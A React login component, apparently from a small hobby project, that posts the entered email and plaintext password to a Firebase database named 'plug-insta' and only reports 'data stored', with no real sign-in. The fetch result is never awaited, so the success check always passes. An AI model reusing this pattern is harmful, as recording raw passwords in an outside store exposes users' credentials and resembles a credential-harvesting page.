import React,{useState} from 'react';
import { Router,Routes, Route, Link } from "react-router-dom";
import { Form, Input,Button } from 'antd';
import Fire from './Fire';
import './Header.css';
import { async } from '@firebase/util';
const Login = () =>
{
  const [user,setUser] = useState(
    {
      email :"",
      password:""
    }
  );

    
      
  // Push Function
 
  let name,value;
  const postUserData = (event) => {
    name = event.target.name;
    value =  event.target.value;
    setUser({ ...user, [name] : value});
  };
  const submit = async (event) =>{

    event.preventDefault();
    const {email,password} = user;
    const res = fetch("https://plug-insta-default-rtdb.firebaseio.com/record.json",
    {
      method : "POST",
      headers : {
        "Content-Type" : "application/json",
      },
      body : JSON.stringify(
        {
          email,
          password
        }
      ),
    }
    );
    if(res){
      alert("data stored");
    }else{
      alert("plz fill the data");    }
  };
    return(
        <div className='acha'>
        <h1>Login!</h1>
        <Form 
           
              >
              <Form.Item
                label="Username"
                name="email"
                value = {user.email}
                onChange={postUserData}
                rules={[{ required: true, message: 'Please input your username!' }]}
              >
                <Input />
              </Form.Item>
        
              <Form.Item
                label="Password"
                name="password"
                value ={user.password}
                onChange={postUserData}
                rules={[{ required: true, message: 'Please input your password!' }]}
              >
                <Input.Password />
              </Form.Item>
              </Form>
              <center>
        <Button type="primary" onClick={submit}><nav>
                <Link className='wow'
                to="/Card" >show me</Link>
              </nav></Button>
        </center>
        <nav>
                <Link to="/Card">show me</Link>
              </nav>
        </div>
          )

};



export default Login;